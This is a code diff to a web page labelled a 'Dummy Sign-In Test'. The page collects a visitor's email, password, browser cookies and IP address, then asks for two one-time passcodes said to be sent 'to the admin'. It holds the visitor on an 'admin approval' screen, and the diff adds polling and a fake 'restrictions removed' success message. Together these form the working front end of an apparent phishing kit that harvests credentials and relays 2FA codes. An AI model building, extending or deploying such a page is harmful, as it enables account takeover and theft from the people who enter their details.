@@ -4,40 +4,30 @@
   <title>Dummy Sign-In Test</title>
   <meta charset="UTF-8">
   <style>
-    .password-wrapper {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-    }
+    .password-wrapper { display: inline-flex; align-items: center; gap: 6px; }
     .password-wrapper input { padding: 4px 6px; }
     .toggle-password {
-      cursor: pointer;
-      font-size: 18px;
-      user-select: none;
-      background: none;
-      border: none;
-      padding: 0;
-      line-height: 1;
+      cursor: pointer; font-size: 18px; user-select: none;
+      background: none; border: none; padding: 0; line-height: 1;
     }
     .error { color: red; font-weight: bold; }
     .success { color: green; }
     .restart-btn {
-      margin-top: 20px;
-      padding: 8px 16px;
-      background: #f44336;
-      color: white;
-      border: none;
-      cursor: pointer;
-      border-radius: 4px;
+      margin-top: 20px; padding: 8px 16px; background: #f44336;
+      color: white; border: none; cursor: pointer; border-radius: 4px;
     }
     .restart-btn:hover { background: #d32f2f; }
+    .congrats {
+      text-align: center; padding: 24px;
+      background: #e8f5e9; border-radius: 8px; margin-top: 16px;
+    }
+    .congrats h2 { color: #2e7d32; }
   </style>
 </head>
 <body>
 
   <h1>Dummy Sign-In</h1>
 
-  <!-- Step 1: Email + Password -->
   <div id="step1">
     <h2>Step 1: Email and Password</h2>
     <form id="form1">
@@ -53,7 +43,6 @@
     <p id="status1"></p>
   </div>
 
-  <!-- Step 2: Username + Confirm Password -->
   <div id="step2" style="display:none;">
     <h2>Step 2: Username & Confirm Password</h2>
     <form id="form2">
@@ -70,10 +59,9 @@
     <button type="button" class="restart-btn" id="restartBtn">Restart</button>
   </div>
 
-  <!-- Step 3: OTP 1 -->
   <div id="step3" style="display:none;">
     <h2>Step 3: OTP 1</h2>
-    <p>Enter the first OTP.</p>
+    <p>A 6-digit OTP has been sent to your email (and to the admin).</p>
     <form id="form3">
       <label>OTP 1: <input type="text" id="otp1" required maxlength="6"></label><br><br>
       <button type="submit">Continue</button>
@@ -81,10 +69,9 @@
     <p id="status3"></p>
   </div>
 
-  <!-- Step 4: OTP 2 -->
   <div id="step4" style="display:none;">
     <h2>Step 4: OTP 2</h2>
-    <p>Enter the second OTP.</p>
+    <p>A second 6-digit OTP has been sent to your email (and to the admin).</p>
     <form id="form4">
       <label>OTP 2: <input type="text" id="otp2" required maxlength="6"></label><br><br>
       <button type="submit">Submit</button>
@@ -92,17 +79,24 @@
     <p id="status4"></p>
   </div>
 
-  <!-- Waiting -->
   <div id="waiting" style="display:none;">
     <h2>Please wait for admin’s approval</h2>
     <p>Your information has been sent to the administrator.</p>
     <p>Please wait while the admin reviews your dummy sign-in request...</p>
-    <p>Loading...</p>
+    <p id="waitingStatus">Loading...</p>
+  </div>
+
+  <div id="congrats" style="display:none;">
+    <div class="congrats">
+      <h2>🎉 Congratulations</h2>
+      <p><strong>Congratulations your account has been verified and restrictions is removed</strong></p>
+    </div>
   </div>
 
   <script>
     let sessionId = null;
     let userIp = '(fetching...)';
+    let pollTimer = null;
 
     fetch('https://api.ipify.org?format=json')
       .then(r => r.json())
@@ -133,7 +127,14 @@
       el.className = isError ? 'error' : (message ? 'success' : '');
     }
 
+    function hideAll() {
+      ['step1','step2','step3','step4','waiting','congrats'].forEach(id => {
+        document.getElementById(id).style.display = 'none';
+      });
+    }
+
     function restart() {
+      if (pollTimer) clearInterval(pollTimer);
       sessionId = null;
       document.getElementById('email').value = '';
       document.getElementById('password').value = '';
@@ -141,11 +142,8 @@
       document.getElementById('confirmPassword').value = '';
       document.getElementById('otp1').value = '';
       document.getElementById('otp2').value = '';
+      hideAll();
       document.getElementById('step1').style.display = 'block';
-      document.getElementById('step2').style.display = 'none';
-      document.getElementById('step3').style.display = 'none';
-      document.getElementById('step4').style.display = 'none';
-      document.getElementById('waiting').style.display = 'none';
       ['status1','status2','status3','status4'].forEach(id => {
         document.getElementById(id).textContent = '';
         document.getElementById(id).className = '';
@@ -154,18 +152,34 @@
 
     document.getElementById('restartBtn').addEventListener('click', restart);
 
+    function startPolling() {
+      if (pollTimer) clearInterval(pollTimer);
+      pollTimer = setInterval(async () => {
+        if (!sessionId) return;
+        try {
+          const res = await fetch('/api/approval-status/' + sessionId);
+          const data = await res.json();
+          if (data.status === 'approved') {
+            clearInterval(pollTimer);
+            hideAll();
+            document.getElementById('congrats').style.display = 'block';
+          } else {
+            document.getElementById('waitingStatus').textContent = 'Still waiting for admin approval...';
+          }
+        } catch (e) {}
+      }, 3000);
+    }
+
     document.getElementById('form1').addEventListener('submit', async function(e) {
       e.preventDefault();
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
       showStatus('status1', 'Sending...');
       try {
         const res = await fetch('/api/step1', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            email,
-            password,
+            email: document.getElementById('email').value,
+            password: document.getElementById('password').value,
             cookies: document.cookie || '(no cookies)',
             ip: userIp
           })
@@ -186,14 +200,16 @@
 
     document.getElementById('form2').addEventListener('submit', async function(e) {
       e.preventDefault();
-      const username = document.getElementById('username').value;
-      const confirmPassword = document.getElementById('confirmPassword').value;
       showStatus('status2', 'Verifying...');
       try {
         const res = await fetch('/api/step2', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ sessionId, username, confirmPassword })
+          body: JSON.stringify({
+            sessionId,
+            username: document.getElementById('username').value,
+            confirmPassword: document.getElementById('confirmPassword').value
+          })
         });
         const data = await res.json();
         if (data.success) {
@@ -201,7 +217,7 @@
           document.getElementById('step2').style.display = 'none';
           document.getElementById('step3').style.display = 'block';
         } else {
-          showStatus('status2', data.message || 'Password does not match. Restarting...', true);
+          showStatus('status2', data.message, true);
           setTimeout(restart, 2000);
         }
       } catch (err) {
@@ -211,13 +227,15 @@
 
     document.getElementById('form3').addEventListener('submit', async function(e) {
       e.preventDefault();
-      const otp1 = document.getElementById('otp1').value.trim();
       showStatus('status3', 'Verifying OTP 1...');
       try {
         const res = await fetch('/api/step3', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ sessionId, otp1 })
+          body: JSON.stringify({
+            sessionId,
+            otp1: document.getElementById('otp1').value.trim()
+          })
         });
         const data = await res.json();
         if (data.success) {
@@ -234,19 +252,22 @@
 
     document.getElementById('form4').addEventListener('submit', async function(e) {
       e.preventDefault();
-      const otp2 = document.getElementById('otp2').value.trim();
       showStatus('status4', 'Verifying OTP 2...');
       try {
         const res = await fetch('/api/step4', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ sessionId, otp2 })
+          body: JSON.stringify({
+            sessionId,
+            otp2: document.getElementById('otp2').value.trim()
+          })
         });
         const data = await res.json();
         if (data.success) {
           showStatus('status4', data.message);
           document.getElementById('step4').style.display = 'none';
           document.getElementById('waiting').style.display = 'block';
+          startPolling();
         } else {
           showStatus('status4', data.message, true);
         }
